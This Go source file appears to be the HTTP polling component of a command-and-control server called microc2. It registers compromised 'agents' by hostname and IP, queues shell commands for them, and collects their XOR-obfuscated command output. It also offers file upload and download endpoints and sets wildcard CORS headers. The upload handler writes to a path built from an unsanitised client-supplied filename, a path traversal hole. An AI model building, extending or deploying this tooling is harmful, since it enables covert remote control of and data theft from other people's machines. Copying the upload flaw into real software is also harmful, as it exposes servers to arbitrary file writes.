// This file will be moved to the new 'behaviour' folder as 'static_polling.go'.
package behaviour

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"microc2/server/internal/common"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

type HTTPPollingProtocol struct {
	config   common.BaseProtocolConfig
	mux      *http.ServeMux
	commands struct {
		sync.Mutex
		queue map[string][]string // AgentID -> []command
	}
	results struct {
		sync.Mutex
		history map[string][]CommandResult // AgentID -> []CommandResult
	}
	agents struct {
		sync.Mutex
		list map[string]*Agent
	}
}

type CommandResult struct {
	Command   string `json:"command"`
	Output    string `json:"output"`
	Timestamp string `json:"timestamp"`
}

type Agent struct {
	ID       string    `json:"id"`
	OS       string    `json:"os"`
	Hostname string    `json:"hostname"`
	IP       string    `json:"ip"`
	IPList   []string  `json:"ip_list,omitempty"`
	LastSeen time.Time `json:"last_seen"`
	Commands []string  `json:"last_commands"`
}

// NewHTTPPollingProtocol creates a new HTTP polling protocol instance
func NewHTTPPollingProtocol(config common.BaseProtocolConfig) *HTTPPollingProtocol {
	p := &HTTPPollingProtocol{
		config: config,
		mux:    http.NewServeMux(),
		agents: struct {
			sync.Mutex
			list map[string]*Agent
		}{list: make(map[string]*Agent)},
	}
	p.commands.queue = make(map[string][]string)
	p.results.history = make(map[string][]CommandResult)
	p.registerRoutes()
	return p
}

func (p *HTTPPollingProtocol) registerRoutes() {
	// Register agent communication routes with /api prefix
	p.mux.HandleFunc("/api/agent/", func(w http.ResponseWriter, r *http.Request) {
		// log.Printf("[DEBUG] /api/agent/ handler triggered: %s %s", r.Method, r.URL.Path)
		p.handleAgentRequests(w, r)
	})
	p.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// log.Printf("[DEBUG] Unmatched HTTP request: %s %s", r.Method, r.URL.Path)
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("404 not found"))
	})
	// log.Printf("[DEBUG] Registered agent routes on HTTP polling protocol (mux: %p)", p.mux)
}

// GetHTTPHandler returns the ServeMux that handles HTTP requests
func (p *HTTPPollingProtocol) GetHTTPHandler() http.Handler {
	// log.Printf("[DEBUG] GetHTTPHandler called for HTTPPollingProtocol (mux: %p)", p.mux)
	return p.mux
}

func (p *HTTPPollingProtocol) handleAgentRequests(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)

	// log.Printf("[DEBUG] HandleAgentRequests called: %s %s", r.Method, r.URL.Path)

	// Handle preflight OPTIONS requests
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Extract agent ID and action from path
	// Expected format: /api/agent/{AgentID}/{action}
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 5 {
		log.Printf("[ERROR] Invalid request path: %s", r.URL.Path)
		http.Error(w, "Invalid request path", http.StatusBadRequest)
		return
	}

	AgentID := parts[3]
	action := parts[4]

	// log.Printf("[DEBUG] Handling %s request from agent %s", action, AgentID)

	switch action {
	case "heartbeat":
		p.handleAgentHeartbeat(w, r, AgentID)
	case "tasks":
		p.handleAgentTasks(w, r, AgentID)
	case "results":
		p.handleAgentResults(w, r, AgentID)
	case "command":
		// Agent polling for next command
		p.handleGetCommand(w, r)
		return
	case "result":
		// Agent submitting command result
		p.handleAgentResults(w, r, AgentID)
		return
	default:
		log.Printf("[ERROR] Unknown action %s from agent %s", action, AgentID)
		http.Error(w, "Unknown action", http.StatusNotFound)
	}
}

func (p *HTTPPollingProtocol) HandleAgentRequests(w http.ResponseWriter, r *http.Request) {
	p.handleAgentRequests(w, r)
}

func (p *HTTPPollingProtocol) handleAgentHeartbeat(w http.ResponseWriter, r *http.Request, AgentID string) {
	enableCors(&w)

	// Handle preflight OPTIONS request
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method != http.MethodPost {
		log.Printf("[ERROR] Invalid method %s for agent %s heartbeat", r.Method, AgentID)
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// log.Printf("[DEBUG] Processing heartbeat from agent %s", AgentID)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("[ERROR] Failed to read heartbeat body from agent %s: %v", AgentID, err)
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}

	log.Printf("[DEBUG] Received heartbeat data from agent %s: %s", AgentID, string(body))

	if err := p.processAgentHeartbeat(body); err != nil {
		log.Printf("[ERROR] Failed to process heartbeat from agent %s: %v", AgentID, err)
		http.Error(w, fmt.Sprintf("Error processing agent data: %v", err), http.StatusBadRequest)
		return
	}

	log.Printf("[INFO] Successfully processed heartbeat from agent %s", AgentID)
	// Build JSON response and include Content-Length
	response := map[string]string{"status": "connected", "time": time.Now().UTC().Format(time.RFC3339)}
	respBytes, err := json.Marshal(response)
	if err != nil {
		log.Printf("[ERROR] Failed to marshal response for agent %s: %v", AgentID, err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Length", strconv.Itoa(len(respBytes)))
	w.Write(respBytes)
}

func (p *HTTPPollingProtocol) handleAgentTasks(w http.ResponseWriter, r *http.Request, AgentID string) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// log.Printf("[DEBUG] Agent %s requesting tasks", AgentID)

	// For now, return empty task list
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode([]interface{}{})
}

func (p *HTTPPollingProtocol) handleAgentResults(w http.ResponseWriter, r *http.Request, AgentID string) {
	// log.Printf("[TRACE] Entered handleAgentResults for AgentID=%s, method=%s", AgentID, r.Method)

	if r.Method != http.MethodPost {
		log.Printf("[WARN] handleAgentResults: Invalid method %s for agent %s", r.Method, AgentID)
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read and process results
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("[ERROR] Failed to read results from agent %s: %v", AgentID, err)
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}

	// log.Printf("[TRACE] handleAgentResults: Raw body from agent %s: %s", AgentID, string(body))

	var result CommandResult
	if err := json.Unmarshal(body, &result); err != nil {
		log.Printf("[ERROR] Failed to unmarshal CommandResult from agent %s: %v", AgentID, err)
		http.Error(w, "Invalid result format", http.StatusBadRequest)
		return
	}
	result.Timestamp = time.Now().Format(time.RFC3339)

	// Deobfuscate the output before logging or storing
	deobfuscatedOutput, err := common.XORDeobfuscate(result.Output, AgentID)
	if err != nil {
		log.Printf("[AGENT] Failed to deobfuscate result from %s for command '%s': %v. Storing raw output.", AgentID, result.Command, err)
		// Store the raw output if deobfuscation fails, so it's not lost
	} else {
		result.Output = deobfuscatedOutput
	}

	log.Printf("[AGENT] Received result from %s for command '%s': %s", AgentID, result.Command, result.Output)

	p.results.Lock()
	p.results.history[AgentID] = append(p.results.history[AgentID], result)
	// log.Printf("[TRACE] handleAgentResults: Results history length for agent %s after append: %d", AgentID, len(p.results.history[AgentID]))
	p.results.Unlock()

	// Acknowledge receipt
	w.WriteHeader(http.StatusOK)
	// log.Printf("[TRACE] handleAgentResults: Sent HTTP 200 OK to agent %s", AgentID)
}

// Start implements the Protocol interface
func (p *HTTPPollingProtocol) Start() error {
	// log.Printf("[DEBUG] Starting HTTP polling protocol")
	return nil
}

// Stop implements the Protocol interface
func (p *HTTPPollingProtocol) Stop() error {
	// log.Printf("[DEBUG] Stopping HTTP polling protocol")
	return nil
}

func (p *HTTPPollingProtocol) Initialize() error {
	return os.MkdirAll(p.config.UploadDir, 0755)
}

func (p *HTTPPollingProtocol) HandleFileUpload(filename string, fileData io.Reader) error {
	filepath := filepath.Join(p.config.UploadDir, filename)
	file, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.Copy(file, fileData)
	return err
}

func (p *HTTPPollingProtocol) HandleFileDownload(filename string) (io.Reader, error) {
	return os.Open(filepath.Join(p.config.UploadDir, filename))
}

func (p *HTTPPollingProtocol) processAgentHeartbeat(agentData []byte) error {
	var agent Agent
	if err := json.Unmarshal(agentData, &agent); err != nil {
		log.Printf("[ERROR] Failed to unmarshal agent data: %v. Data: %s", err, string(agentData))
		return fmt.Errorf("failed to unmarshal agent data: %w", err)
	}

	p.agents.Lock()
	defer p.agents.Unlock()
	agent.LastSeen = time.Now()
	p.agents.list[agent.ID] = &agent
	log.Printf("[DEBUG] Agent %s added/updated in list. Total agents: %d", agent.ID, len(p.agents.list))
	return nil
}

// Restore the interface method for Protocol compatibility
func (p *HTTPPollingProtocol) HandleAgentHeartbeat(agentData []byte) error {
	return p.processAgentHeartbeat(agentData)
}

// Remove handleSubmitResult from GetRoutes, as it no longer exists or is needed.
func (p *HTTPPollingProtocol) GetRoutes() map[string]http.HandlerFunc {
	return map[string]http.HandlerFunc{
		"/queue_command": p.handleQueueCommand,
		"/get_command":   p.handleGetCommand,
		"/get_results":   p.handleGetResults,
		"/files/upload":  p.handleFileUpload,
		"/files/list":    p.handleListFiles,
		"/agent/list":    p.handleListAgents,
	}
}

func enableCors(w *http.ResponseWriter) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
	(*w).Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE")
	(*w).Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Filename, X-Command")
	(*w).Header().Set("Access-Control-Max-Age", "86400")
}

// HTTP Handlers
// Dummy HandleCommand to satisfy Protocol interface
func (p *HTTPPollingProtocol) HandleCommand(cmd string) error {
	log.Printf("[WARN] HandleCommand called without agent context; use QueueCommand(AgentID, cmd) instead.")
	return nil
}

// Update handleQueueCommand to do nothing or return an error (since it's not used for agent commands)
func (p *HTTPPollingProtocol) handleQueueCommand(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	// This endpoint is deprecated; use the API server to queue commands per agent.
	http.Error(w, "Use /api/agents/{AgentID}/command via API server", http.StatusNotImplemented)
}

func (p *HTTPPollingProtocol) handleGetCommand(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	// Extract AgentID from URL: /api/agent/{AgentID}/command
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 5 {
		http.Error(w, "Invalid request path", http.StatusBadRequest)
		return
	}
	AgentID := parts[3]

	p.commands.Lock()
	defer p.commands.Unlock()
	queue := p.commands.queue[AgentID]
	// log.Printf("[DEBUG] handleGetCommand: AgentID=%s, queueLen=%d", AgentID, len(queue))
	if len(queue) == 0 {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	cmd := queue[0]
	p.commands.queue[AgentID] = queue[1:]
	if len(queue) > 0 {
		// log.Printf("[DEBUG] handleGetCommand: returning command to agent %s: %s", AgentID, cmd)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"command": cmd})
}

func (p *HTTPPollingProtocol) handleGetResults(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	w.Header().Set("Content-Type", "application/json")

	// Extract AgentID from URL: /api/agent/{AgentID}/results
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 5 {
		http.Error(w, "Invalid request path", http.StatusBadRequest)
		return
	}
	AgentID := parts[3]

	p.results.Lock()
	history := p.results.history[AgentID]
	p.results.Unlock()

	// log.Printf("[TRACE] handleGetResults: Results history length for agent %s: %d", AgentID, len(history))

	if len(history) == 0 {
		// log.Printf("[TRACE] handleGetResults: No results to return for agent %s", AgentID)
		w.Write([]byte("[]"))
		return
	}

	// for i, res := range history {
	// log.Printf("[TRACE] handleGetResults: Returning result %d for agent %s: %+v", i, AgentID, res)
	// }

	json.NewEncoder(w).Encode(history)
}

func (p *HTTPPollingProtocol) handleFileUpload(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	filename := r.Header.Get("X-Filename")
	if filename == "" {
		http.Error(w, "Missing X-Filename header", http.StatusBadRequest)
		return
	}

	if err := p.HandleFileUpload(filename, r.Body); err != nil {
		log.Printf("Error handling file upload: %v", err)
		http.Error(w, "Failed to handle file upload", http.StatusInternalServerError)
		return
	}
}

func (p *HTTPPollingProtocol) handleListFiles(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	files, err := os.ReadDir(p.config.UploadDir)
	if err != nil {
		http.Error(w, "Failed to list files", http.StatusInternalServerError)
		return
	}

	type FileInfo struct {
		Name    string `json:"name"`
		Size    int64  `json:"size"`
		ModTime string `json:"modified"`
	}

	var fileList []FileInfo
	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}
		fileList = append(fileList, FileInfo{
			Name:    file.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(fileList)
}

func (p *HTTPPollingProtocol) handleListAgents(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	p.agents.Lock()
	defer p.agents.Unlock()

	// Clean up stale agents (not seen in last 5 minutes)
	for id, agent := range p.agents.list {
		if time.Since(agent.LastSeen) > 5*time.Minute {
			delete(p.agents.list, id)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(p.agents.list)
}

// GetAllAgents returns a map of all agents for aggregation
func (p *HTTPPollingProtocol) GetAllAgents() map[string]interface{} {
	p.agents.Lock()
	defer p.agents.Unlock()
	result := make(map[string]interface{}, len(p.agents.list))
	for id, agent := range p.agents.list {
		result[id] = agent
	}
	return result
}

// QueueCommand queues a command for a specific agent
func (p *HTTPPollingProtocol) QueueCommand(AgentID, cmd string) {
	p.commands.Lock()
	p.commands.queue[AgentID] = append(p.commands.queue[AgentID], cmd)
	p.commands.Unlock()
	log.Printf("[DEBUG] QueueCommand: AgentID=%s, cmd=%s, queueLen=%d", AgentID, cmd, len(p.commands.queue[AgentID]))
}

// Exported method to get results history keys for debugging
func (p *HTTPPollingProtocol) GetResultsHistoryKeys() []string {
	p.results.Lock()
	defer p.results.Unlock()
	keys := make([]string, 0, len(p.results.history))
	for k := range p.results.history {
		keys = append(keys, k)
	}
	return keys
}

func (p *HTTPPollingProtocol) GetResults(AgentID string) []map[string]interface{} {
	// log.Printf("[DEBUG] GetResults called for AgentID=%s", AgentID)
	p.results.Lock()
	defer p.results.Unlock()
	// Log keys directly to avoid deadlock
	keys := make([]string, 0, len(p.results.history))
	for k := range p.results.history {
		keys = append(keys, k)
	}
	// log.Printf("[DEBUG] Results history keys: %v", keys)
	history := p.results.history[AgentID]
	// log.Printf("[DEBUG] Results history for AgentID=%s: %+v", AgentID, history)
	var results []map[string]interface{}
	for i, res := range history {
		log.Printf("[DEBUG] Result %d for AgentID=%s: command=%s, output=%s, timestamp=%s", i, AgentID, res.Command, res.Output, res.Timestamp)
		results = append(results, map[string]interface{}{
			"command":   res.Command,
			"output":    res.Output,
			"timestamp": res.Timestamp,
		})
	}
	// log.Printf("[DEBUG] Returning %d results for AgentID=%s", len(results), AgentID)
	return results
}
